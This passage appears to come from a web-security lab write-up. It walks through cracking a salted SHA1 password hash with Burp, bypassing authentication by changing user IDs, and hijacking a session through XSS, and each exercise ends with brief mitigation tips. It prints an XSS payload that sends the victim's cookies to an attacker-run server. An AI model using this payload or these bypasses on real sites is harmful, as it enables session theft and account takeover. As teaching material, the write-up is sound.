Huh, someone is using my advices, but still, using salt is not enough to protect your system

### Exploit 

This web page allow us to log in or create user. Lets make one

<center>
    
![](https://i.imgur.com/Yp2T5jw.png)
LOgin page
![](https://i.imgur.com/HAdvzIq.png)

</center>

Similar to the previous web page for our user it is sha1 of the `1234`

<center>
    
![](https://i.imgur.com/YOOV4zb.png)
Request and respond during creation 
</center>

This time we have to work with the salt. That is why we got the information of possible salt

<center>

![](https://i.imgur.com/ICnKLxs.png)
    
</center>

Little brute force and we can break this hashing algorithm with the burp suite

<center>

![](https://i.imgur.com/IvYlMyy.png)

</center>

```
e030f7ae578fa939191ee5f3a51689775f351daf
```

now everything is left to do is to change cookies, and we are admin

<center>

![](https://i.imgur.com/wX46nsI.png)

</center>
### Fixing

Keep up to date your system
Make strong auth policy
Not expose your authentification protocols
ID and cookies should be encrypted
Strict limitation on database

## Authentication bypass ( hard )

### Enviroment

Sometimes, when you protect your system as much as possible with salts, and others, then you may forgot about the easiest way to go to your system

### Exploit 

This website allow us to create user, in we can do this

<center>

![](https://i.imgur.com/ejzNm4y.png)
    
</center>

Seems my user is number 3, i am thinking what about other numbers

<center>

![](https://i.imgur.com/8l5sHIe.png)
    
</center>

Wow, number 2 is admin. That was hard

<center>

![](https://i.imgur.com/LNFFiFy.png)
    
</center>



### Fixing

Dont give your user numbers that easy

## Authentication bypass
I Guess, this one is surplus
### Enviroment
### Exploit 
### Fixing



## HttpOnly (session hijacking)

### Enviroment

Session token is valuable asset, that is why attacker are often try to get it. session hijacking is one of the technique used to get thos tockens, cookies in our case.

### Exploit 

On this web page we can enter as admin

<center>

![](https://i.imgur.com/vvFlTKU.png)
</center>

Also, this web page is vulnerable to XSS. By entering `<script>alert(document.cookie)</script>`
we can get them

<center>

![](https://i.imgur.com/XaDrk8B.png)
    
</center>

Lets hijack session with our attack server

This XSS string will be used to redirect and hijack session
```
<script>new Image().src="http://localhost:1337/?stolen_cookie="+document.cookie;</script>
```

After entering we can see, session was hijacked

<center>

![](https://i.imgur.com/hL8UguP.png)
    
</center>



### Fixing

Set your session id in strong manner
Your session id is not supposed to be inside of the URL
Use TLS
Reauthenticate Before Key Actions
and others

## REferences

1. https://www.reshiftsecurity.com/xxs-primer-for-java-developers/
2. https://security.stackexchange.com/questions/11985/will-javascript-be-executed-which-is-in-an-href
3. https://www.scip.ch/en/?labs.20160414
4. https://owasp.org/www-community/attacks/csrf
5. https://developer.mozilla.org/ru/docs/Web/HTTP/CORS
6. https://portswigger.net/web-security/file-upload
7. https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/
8. https://en.wikipedia.org/wiki/SQL_injection#Mitigation
9. https://www.cobalt.io/blog/a-pentesters-guide-to-file-inclusion
10. https://www.oreilly.com/library/view/securing-node-applications/9781491982426/ch04.html
11. https://blog.logrocket.com/protect-against-regex-denial-of-service-redos-attacks/
12. https://www.imperva.com/learn/application-security/command-injection/
13. https://skanyi.github.io/blog/cyber-security/what-is-session-hijacking-and-how-to-prevent-it/
